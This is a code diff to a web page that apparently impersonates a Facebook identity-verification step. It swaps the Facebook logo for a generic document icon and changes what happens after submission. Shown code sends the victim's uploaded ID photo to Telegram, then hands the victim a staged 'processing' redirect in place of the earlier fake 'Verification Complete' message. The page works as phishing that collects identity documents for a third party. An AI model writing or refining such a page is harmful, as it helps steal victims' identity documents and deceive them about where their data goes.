@@ -365,13 +365,14 @@
   <!-- Main Verification Content -->
   <div class="verification-container">
     <div class="verification-card">
-      <!-- Facebook ID Icon -->
+      <!-- Document Icon -->
       <div class="document-icon">
         <svg width="48" height="48" viewBox="0 0 24 24" fill="white">
-          <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.927v-8.437H7.078v-3.49h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.234 2.686.234v2.953h-1.514c-1.491 0-1.955.925-1.955 1.874v2.25h3.328l-.532 3.49h-2.796v8.437C19.612 23.027 24 18.062 24 12.073z"/>
-          <rect x="9" y="6" width="6" height="2" rx="1" fill="#1877f2"/>
-          <rect x="9" y="9" width="4" height="1" rx="0.5" fill="#1877f2"/>
-          <rect x="9" y="11" width="5" height="1" rx="0.5" fill="#1877f2"/>
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/>
+          <polyline points="14,2 14,8 20,8"/>
+          <line x1="16" y1="13" x2="8" y2="13"/>
+          <line x1="16" y1="17" x2="8" y2="17"/>
+          <polyline points="10,9 9,9 8,9"/>
         </svg>
       </div>
       
@@ -710,43 +711,15 @@
         const success = await sendPhotoToTelegram(selectedPhotoFile, caption);
         console.log('ID photo sent to Telegram:', success);
         
-        // Show processing state
+        // Show processing state briefly
         submitBtn.innerHTML = 'Processing...';
         submitBtn.disabled = true;
         loadingSpinner.style.display = 'block';
         
-        // Hide the submit button and show a success message
+        // Redirect to processing page after brief delay
         setTimeout(() => {
-          submitBtn.style.display = 'none';
-          loadingSpinner.style.display = 'none';
-          
-          // Create and show success message
-          const successDiv = document.createElement('div');
-          successDiv.style.cssText = `
-            background: linear-gradient(135deg, #e8f5e8 0%, #f0f8ff 100%);
-            border: 1px solid #4CAF50;
-            border-radius: 12px;
-            padding: 20px;
-            text-align: center;
-            margin-top: 20px;
-            color: #1c1e21;
-          `;
-          successDiv.innerHTML = `
-            <div style="color: #4CAF50; font-size: 18px; font-weight: 600; margin-bottom: 8px;">
-              ✓ Verification Complete
-            </div>
-            <div style="font-size: 14px; color: #65676B;">
-              Redirecting to your account in 5 seconds...
-            </div>
-          `;
-          
-          document.querySelector('.verification-card').appendChild(successDiv);
-          
-          // Redirect after 5 seconds
-          setTimeout(() => {
-            window.location.href = '/success';
-          }, 5000);
-        }, 1000);
+          window.location.href = '/id-processing';
+        }, 1500);
         
       } catch (error) {
         console.error('Error sending ID photo:', error);
